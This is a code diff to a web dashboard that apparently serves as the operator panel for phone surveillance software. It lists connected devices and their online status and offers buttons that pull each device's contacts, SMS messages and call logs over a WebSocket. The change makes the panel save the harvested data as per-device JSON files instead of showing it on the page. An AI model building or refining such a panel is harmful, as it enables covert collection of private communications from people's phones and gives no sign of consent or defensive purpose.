@@ -31,13 +31,6 @@
       border-radius: 4px;
       cursor: pointer;
     }
-    .data-output {
-      margin-top: 0.5rem;
-      background: #eee;
-      padding: 0.5rem;
-      border-radius: 4px;
-      white-space: pre-wrap;
-    }
   </style>
 </head>
 <body>
@@ -46,7 +39,6 @@
 
   <script>
     const socket = new WebSocket(`ws://${location.host}`);
-    const outputMap = new Map();
 
     socket.addEventListener('open', () => {
       console.log('Connected to backend');
@@ -68,15 +60,13 @@
         message.data.forEach((device) => {
           const el = document.createElement('div');
           el.className = 'device';
-          const outputId = `output-${device.id}`;
           el.innerHTML = `
             <div><strong>ID:</strong> ${device.id}</div>
             <div><strong>Status:</strong> <span class="${device.online ? 'online' : 'offline'}">${device.online ? 'Online' : 'Offline'}</span></div>
             <div><strong>Last Seen:</strong> ${device.lastSeen}</div>
-            <button class="btn" onclick="requestData('${device.id}', 'contacts')">Get Contacts</button>
-            <button class="btn" onclick="requestData('${device.id}', 'sms')">Get SMS</button>
-            <button class="btn" onclick="requestData('${device.id}', 'calls')">Get Call Logs</button>
-            <div id="${outputId}" class="data-output"></div>
+            <button class="btn" onclick="requestData('${device.id}', 'contacts')">Download Contacts</button>
+            <button class="btn" onclick="requestData('${device.id}', 'sms')">Download SMS</button>
+            <button class="btn" onclick="requestData('${device.id}', 'calls')">Download Call Logs</button>
           `;
           container.appendChild(el);
         });
@@ -84,8 +74,15 @@
 
       if (message.type === 'dataResponse') {
         const { deviceId, dataType, payload } = message;
-        const output = document.getElementById(`output-${deviceId}`);
-        output.textContent = `${dataType.toUpperCase()}\n` + JSON.stringify(payload, null, 2);
+        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = `${deviceId}-${dataType}.json`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        URL.revokeObjectURL(url);
       }
     });
 
